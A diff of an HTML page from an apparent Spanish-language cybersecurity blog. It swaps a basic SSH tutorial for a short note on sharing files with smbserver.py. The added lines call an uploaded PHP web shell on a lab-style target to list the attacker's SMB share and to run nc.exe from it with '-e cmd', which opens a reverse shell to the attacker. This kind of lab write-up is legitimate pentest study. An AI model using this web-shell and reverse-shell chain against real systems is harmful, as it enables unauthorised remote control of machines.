@@ -19,15 +19,15 @@
 
   <!--------------------- Begin Jekyll SEO tag v2.8.0 ----------------------------->
 
-   <title>F1r0x | Blog sobre Ciberseguridad.</title>
+   <title>F1r0x</title>
    <link rel="icon" href="/assets/images/logoweb.ico">
    <meta name="generator" content="Jekyll v3.9.2" />
    <meta property="og:title" content="F1r0x" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Blog sobre Ciberseguridad." />
    <meta property="og:description" content="Blog sobre Ciberseguridad." />
-   <link rel="canonical" href="https://f1r0x.github.io/Web/ssh.html" />         <!-- ¡¡¡ Cambiar !!!  -->
-   <meta property="og:url" content="https://f1r0x.github.io/Web/ssh.html" />    <!-- ¡¡¡ Cambiar !!!  -->
+   <link rel="canonical" href="https://f1r0x.github.io/Web/.html" />         <!-- ¡¡¡ Cambiar !!!  -->
+   <meta property="og:url" content="https://f1r0x.github.io/Web/.html" />    <!-- ¡¡¡ Cambiar !!!  -->
    <meta property="og:site_name" content="F1r0x" />
    <meta property="og:type" content="website" />
    <meta name="twitter:card" content="summary" />
@@ -44,7 +44,7 @@
     <a id="a-title" href="/">
       <h5>F1r0x</h5>                                                                                                    <!-- Nombre del Autor -->                         
     </a>
-    <h6></h6>                                                                                 <!-- Descripción de la Página-->
+    <h6>Herramientas</h6>                                                                                 <!-- Descripción de la Página-->
 
 <!--------------------------------- Botón Github ---------------------------------------->    
     <section id="downloads">         
@@ -73,7 +73,15 @@
 <!----------------------------------------------------------------------------------------->
 
 <div class="container">
-  
+
+<!---------------------- Botones de Anterior y Siguiente --------------------------------->
+<!--
+<div id="main-container">
+  <a href="#" class="btn btn-anterior-con-titulo">Artículo anterior</a>
+  <a href="#" class="btn btn-siguiente-con-titulo">Artículo siguiente</a>
+  <a href="./cursolinux_1.html" class="btn btn-curso-linux">Índice Curso Linux</a>
+</div>  
+-->
 <!----------------------------- Imagen Hack The Box -------------------------------------->   
 
 <!--
@@ -93,7 +101,7 @@
     <symbol id="s-text">
       <text text-anchor="middle"
             x="50%" y="50%" dy=".35em">
-        SSH   <!-- Palabra del Letrero-->
+        Smbserver   <!-- Palabra del Letrero-->
       </text>
     </symbol>  
   
@@ -115,88 +123,28 @@
 <!----------------------------------------------------------------------------------------->
 <!----------------------------------------------------------------------------------------->
 
+<h1 id="crear-recurso-compartido-con-smbserver">Crear recurso compartido con Smbserver:</h1>
 
-<h1 id="qué-es-ssh">¿Qué es SSH?</h1>
-
-<p>SSH o Secure Shell, es un protocolo de administración remota que le permite a los usuarios controlar y modificar sus servidores remotos a través 
-de Internet a través de un mecanismo de autenticación.</p>
-
-<p>Proporciona un mecanismo para autenticar un usuario remoto, transferir entradas desde el cliente al host y retransmitir la salida de vuelta al 
-cliente. El servicio se creó como un reemplazo seguro para el Telnet sin cifrar y utiliza técnicas criptográficas para garantizar que todas las 
-comunicaciones hacia y desde el servidor remoto sucedan de manera encriptada.</p>
-
-<h1 id="cómo-funciona-ssh">¿Cómo funciona SSH?</h1>
-
-<p>Si usas Linux o Mac, entonces usar el protocolo SSH es muy fácil. Si utilizas Windows, deberás utilizar un cliente SSH para abrir conexiones SSH.
-Para iniciar un servicio SSH en Linux ejecutamos el comando <code class="language-plaintext highlighter-rouge">ssh</code>, donde especificamos el <code class="language-plaintext highlighter-rouge">usurio</code> y el <code class="language-plaintext highlighter-rouge">host</code> separados por <code class="language-plaintext highlighter-rouge">@</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh [Usuario]@[Host]
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py smbFolder $(pwd) -smb2support
 </code></pre></div></div>
 
-<p><code class="language-plaintext highlighter-rouge">ssh</code> : Le indica a tu sistema que desea abrir una Conexión de Shell Segura y cifrada.</p>
+<p>De esta forma crearemos un recurso compartido a nivel de red que al cual podremos acceder desde cualquier navegador y pudiendo ver y compartir
+archivos.</p>
 
-<p><code class="language-plaintext highlighter-rouge">Usuario</code> : Representa la cuenta a la que deseas acceder. Podemos acceder como <code class="language-plaintext highlighter-rouge">root</code> si queremos tener máximos privilegios en el equipo cliente.</p>
+<p>Para acceder a este recurso compartido simplemente escribimos nuestra Ip en el navegador seguido del nombre que le hemos dado a la carpeta compartida,
+en este caso <code class="language-plaintext highlighter-rouge">smbFolder</code>.</p>
 
-<p><code class="language-plaintext highlighter-rouge">Host</code> :  Hace referencia al equipo al que quieres acceder. Esto puede ser una dirección IP (10.10.10.10) o un nombre de 
-          dominio (www.ejemplo.com).</p>
+<p><code class="language-plaintext highlighter-rouge">Ejemplos</code>:</p>
 
-<p>Una vez establecida la conexión nos pedira la contraseña de la cuenta solicitada. La introducimos, pulsamos <code class="language-plaintext highlighter-rouge">Enter</code> y finalmente tendremos control
-del equipo.</p>
+<p>Mostrar con dir los recursos compartidos:</p>
 
-<h1 id="puerto-predeterminado-ssh">Puerto predeterminado SSH</h1>
-
-<p>La comunicación inalámbrica o por cable entre dos máquinas se realiza a través de puertos. Hay un total de 65,536 puertos de comunicación y la 
-comunicación puede tener lugar a través de cualquiera de estos puertos. SSH se comunica por defecto a través del puerto 22. Cuando ejecutamos el 
-comando anterior, la conexión entre el cliente local y el servidor se establece a través del puerto 22 y toda la comunicación se ejecuta a través 
-de este puerto.</p>
-
-<h1 id="especificar-puerto-de-conexión-con-ssh">Especificar puerto de conexión con SSH</h1>
-
-<p>En ocasiones, <code class="language-plaintext highlighter-rouge">se puede modificar el puerto por el cual se conecta SSH</code>. En caso de no especificar ningún puerto, SSH se conectará por defecto por
-el puerto 22. En caso de querer especificar otro puerto lo podemos hacer con la opción <code class="language-plaintext highlighter-rouge">-p</code> seguido del puerto en cuestión.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh [Usuario]@[Dirección] -p [Puerto]
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=dir \\10.10.14.75\smbFolder\
 </code></pre></div></div>
 
-<h1 id="conectarse-a-un-servicio-ssh-con-sshpass">Conectarse a un servicio SSH con SSHPASS:</h1>
+<p>Ejecutar nc.exe a través del navegador, tendremos que especificar una dirección y un puerto de escucha:</p>
 
-<p>La utilidad sshpass está diseñada para ejecutar SSH utilizando el modo de autenticación de contraseña interactiva
-con el teclado, pero de una manera no interactiva. De esta forma podemos especificar en la misma línea de comandos
-la contraseña antes de ejecutar el comando SSH. La contraseña debe establecerse entre comillas dobles:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshpass -p ["Contraseña"] ssh [Usuario]@[Dirección] -p [Puerto] 
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.198:8080/upload/kamehameha.php?telepathy=\\10.10.14.75\smbFolder\nc.exe -e cmd [Ip Atacante] [Puerto en Escucha]
 </code></pre></div></div>
-
-<h1 id="ejemplo-de-conexión-ssh">Ejemplo de conexión SSH:</h1>
-
-<p>Para realizar un ejemplo de como conectarnos a otro equipo empleando SSH vamos a utilizar la web <code class="language-plaintext highlighter-rouge">https://overthewire.org</code>. Esta página está 
-enfocada en enseñar los parámetros básicos de Linux y SSH a través de distintos laboratorios. A estos laboratorios nos conectaremos a través de
-SSH y la finalidad de cada práctica es encontrar la flag secreta oculta en cada sistema. La flag encontrada es la contraseña para poder conectarnos
-al siguiente nivel.</p>
-
-<p>En este ejemplo únicamente mostraremos como conectarnos a través de SSH, para ver todas prácticas de <code class="language-plaintext highlighter-rouge">Over The Wire</code> podéis encontrarlas en la 
-sección de Laboratorios.</p>
-
-<p>En primer lugar, abrimos la página oficial de Over The Wire:</p>
-
-<p><img class="img-ssh1" src="https://user-images.githubusercontent.com/103068924/195438160-e7db9a69-f9d1-4ee9-b8dd-a494988ad836.png" alt="Captura de pantalla 2022-10-12 220427" /></p>
-
-<p>Una vez abierta nos dirigimos al <code class="language-plaintext highlighter-rouge">Nivel 0</code>:</p>
-
-<p><img src="https://user-images.githubusercontent.com/103068924/195438319-f437c607-eae0-4a8a-84f1-59b286582a8c.png" alt="Captura de pantalla 2022-10-12 221133" /></p>
-
-<p>Vemos como nos dice que el nombre del usuario es <code class="language-plaintext highlighter-rouge">bandit0</code> que la contraseña es <code class="language-plaintext highlighter-rouge">bandit0</code> también, la dirección es <code class="language-plaintext highlighter-rouge">bandit.labs.overthewire.org</code>
-y nos indica que debemos utilizar el <code class="language-plaintext highlighter-rouge">puerto 2220</code>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bandit0@bandit.labs.overthewire.org -p 2220 
-</code></pre></div></div>
-
-<p>Una vez ejecutado el comando anterior, nos pedirá la contraseña, la introducimos y ya tendremos acceso al 
-otro equipo:</p>
-
-<p><img src="https://user-images.githubusercontent.com/103068924/195438782-444534be-f275-4742-a489-8f93d475accf.png" alt="Captura de pantalla 2022-10-12 221350" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/103068924/195439083-539b1748-e770-40c1-bb04-97c0a24a6f91.png" alt="Captura de pantalla 2022-10-12 221444" /></p>
 
 
 
@@ -290,7 +238,6 @@ otro equipo:</p>
 
     </div>
 </html>
-
 
 <!------------------------------------------------------------------------------------------------->
 <!------------------------------------------------------------------------------------------------->
